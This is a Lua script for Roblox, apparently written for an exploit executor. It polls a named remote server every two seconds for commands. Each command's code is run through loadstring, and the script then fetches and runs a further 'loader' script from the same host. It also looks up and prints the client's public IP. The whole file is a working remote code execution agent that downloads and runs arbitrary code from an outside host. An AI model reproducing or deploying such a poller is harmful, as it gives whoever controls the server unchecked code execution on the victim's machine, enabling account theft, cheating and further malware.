-- Roblox Poller Script
-- Polls server for commands and executes them
-- After main script execution, loads the loader script

local SERVER_URL = "https://coachtopia.fun"
local POLL_INTERVAL = 2

-- Track executed command names to prevent re-execution
local executedCommands = {}

-- HTTP request function
local function httpGet(url)
    local success, response = pcall(function()
        return game:HttpGet(url, true)
    end)
    if success then
        return response
    else
        warn("[HTTP] GET failed:", response)
        return nil
    end
end

local function httpPost(url, body)
    local success, response = pcall(function()
        return game:HttpPost(url, body, true, "application/json")
    end)
    if success then
        return response
    else
        warn("[HTTP] POST failed:", response)
        return nil
    end
end

-- Get client IP for debugging
local function getIP()
    local services = {
        "https://api.ipify.org",
        "https://ipinfo.io/ip",
        "https://checkip.amazonaws.com"
    }
    
    for _, service in ipairs(services) do
        local ip = httpGet(service)
        if ip and ip ~= "" then
            return ip:gsub("%s+", "")
        end
    end
    return "unknown"
end

-- Display startup info
print("========================================")
print("Roblox Poller Started")
print("Server:", SERVER_URL)
print("Poll Interval:", POLL_INTERVAL .. "s")
print("Your IP:", getIP())
print("========================================")
print("[POLL] Waiting for commands... (Press 'set' on website)")

-- Main polling loop
while true do
    -- Poll for pending commands
    local response = httpGet(SERVER_URL .. "/api/commands/pending")
    
    if response then
        local success, data = pcall(function()
            return game:GetService("HttpService"):JSONDecode(response)
        end)
        
        if success and data.success and data.commands then
            if #data.commands > 0 then
                print("[POLL] Found", #data.commands, "command(s)")
                
                for _, cmd in ipairs(data.commands) do
                    -- Skip if this command name was already executed
                    if executedCommands[cmd.name] then
                        print("[EXECUTE] Skipping already executed command:", cmd.name)
                    else
                        print("[EXECUTE] Executing command:", cmd.name)
                        
                        -- Mark this command as executed locally
                        executedCommands[cmd.name] = true
                        
                        -- Delete command from server immediately
                        httpPost(SERVER_URL .. "/api/commands/" .. cmd.name .. "/executed", "")
                        
                        -- Execute the main script
                        local execSuccess, execErr = pcall(function()
                            loadstring(cmd.code)()
                        end)
                        
                        if execSuccess then
                            print("[EXECUTE] Main script executed successfully")
                        else
                            warn("[EXECUTE] Main script failed:", execErr)
                        end
                        
                        -- After main script, load and execute loader script
                        print("[LOADER] Fetching loader script...")
                        local loaderResponse = httpGet(SERVER_URL .. "/api/loader")
                        
                        if loaderResponse then
                            local loaderSuccess, loaderData = pcall(function()
                                return game:GetService("HttpService"):JSONDecode(loaderResponse)
                            end)
                            
                            if loaderSuccess and loaderData.success and loaderData.code then
                                print("[LOADER] Executing loader script...")
                                local loadSuccess, loadErr = pcall(function()
                                    loadstring(loaderData.code)()
                                end)
                                
                                if loadSuccess then
                                    print("[LOADER] Loader script executed successfully")
                                else
                                    warn("[LOADER] Loader script failed:", loadErr)
                                end
                            else
                                warn("[LOADER] Failed to decode loader response")
                            end
                        else
                            warn("[LOADER] Failed to fetch loader script")
                        end
                    end
                end
            end
        else
            warn("[POLL] Failed to decode response")
        end
    else
        warn("[POLL] Failed to poll server")
    end
    
    -- Wait before next poll
    wait(POLL_INTERVAL)
end
